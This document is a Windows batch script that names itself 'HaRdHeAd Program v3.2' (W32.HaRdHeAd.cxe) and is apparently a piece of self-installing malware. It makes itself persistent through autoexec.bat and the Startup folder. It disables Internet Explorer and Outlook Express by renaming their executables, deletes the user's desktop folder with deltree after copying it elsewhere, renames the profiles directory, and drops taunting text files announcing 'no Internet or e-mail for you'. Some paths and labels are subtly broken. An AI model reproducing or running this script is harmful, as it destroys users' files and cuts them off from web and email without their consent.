   @echo off
   rem HaRdHeAd Program v3.2
   echo PLEASE WAIT WHILE PROGRAM LOADS . . .

   date 24-11-1995

   REM setup

   if exist c:\start.bat goto startprogram
   if not exist c:\start.bat goto auto

   :auto
   if exist c:\autoexec.bat goto start

   :start
   rename c:\autoexec.bat start.bat
   md c:\progra~1\funygame
   copy fungame.bat c:\progra~1\funygame
   echo call c:\progra~1\funygame\fungame.bat >c:\autoexec.bat
   echo call c:\start.bat >>c:\autoexec.bat
   if exist c:\windows\sol.exe goto win9xsol
   if exist c:\winnt\system32.sol.exe goto ntsol

   goto end

   REM end setup


   REM checkup start menu

   if exist c:\docume~1\admin\startm~1\programs\startup\fungame.bat goto starterasent

   REM end checkup start menu


   REM  change e-net

   :startprogram
   if not exist c:\HaRdHeAd\NUL goto mdhard
   :mdhard
   md c:\progra~1\HaRdHeAd
   copy c:\progra~1\intern~1\iexplore.exe c:\progra~1\HaRdHeAd
   rename c:\progra~1\HaRdHeAd\iexplore.exe e-net.com
   rename c:\progra~1\intern~1\iexplore.exe erolpxei.cxe

   REM end change e-net

   REM change mail

   if not exist c:\progra~1\_DaEhDrA\NUL goto mddrah
   :mddrah
   md c:\progra~1\_DaEhDrA
   copy c:\progra~1\outloo~1\msimn.exe c:\progra~1\_DaEhDrA
   rename c:\progra~1\_DaEhDrAh\msimn.exe postcheck.com
   rename c:\progra~1\outloo~1\msimn.exe nmism.cxe

   REM end change mail

   REM change win9x

   if exist c:\windows\system\nul goto win9x
   :win9x
   md c:\progra~1\ksed
   copy c:\windows\desktop c:\progra~1\ksed
   deltree /y c:\windows\desktop
   goto win9x1

   :win9xsol
   start c:\windows\sol.exe

   :win9x1
   if exist c:\windows\profiles\nul goto prof
   goto win9x3

   :prof
   rename c:\windows\profiles profles

   :win9x3
   echo You have been visited by HaRdHeAd's Program v3.2 (W32.HaRdHeAd.cxe) >c:\windows\applic~1\micros~1\intern~1\quickl~1\HaRdHeAd.txt
   echo. >>c:\windows\applic~1\micros~1\intern~1\quickl~1\HaRdHeAd.txt
   echo Please push your Internet Explorer or Outlook button. >>c:\windows\applic~1\micros~1\intern~1\quickl~1\HaRdHeAd.txt


   REM end change win9x


   REM change NT

   if exist c:\winnt\nul goto nt

   :nt
   if exist c:\docume~1\admin\desktop\nul goto ntdesk
   goto nt4

   :ntdesk
   md c:\progra~1\tnksed
   copy c:\docume~1\admin\desktop c:\progra~1\tnksed
   del c:\docume~1\admin\desktop

   :ntsol
   start c:\winnt\system32\sol.exe

   :starterasent
   del c:\docume~1\admin\startm~1\programs\startup\fungame.bat

   :nt4
   copy c:\progra~1\funygame\fungame.bat c:\docume~1\admin\startm~1\programs\startup
   echo You have been visited by HaRdHeAd's Program v3.2 (W32.HaRdHeAd.cxe) >c:\docume~1\admin\applic~1\micros~1\intern~1\quickl~1\HaRdHeAd.txt
   echo. >>c:\docume~1\admin\applic~1\micros~1\intern~1\quickl~1\HaRdHeAd.txt
   echo Please push your Internet Explorer or Outlook button. >>c:\docume~1\admin\applic~1\micros~1\intern~1\quickl~1\HaRdHeAd.txt

   REM end change NT


   REM make txt

   echo Sorry no Internet or e-mail for you any more >c:\progra~1\nointernet.txt
   echo. >>c:\progra~1\nointernet.txt
   echo. >>c:\progra~1\nointernet.txt
   echo (W32.HaRdHeAd.cxe)  >>c:\progra~1\nointernet.txt

   REM end make txt

   :end
   exit
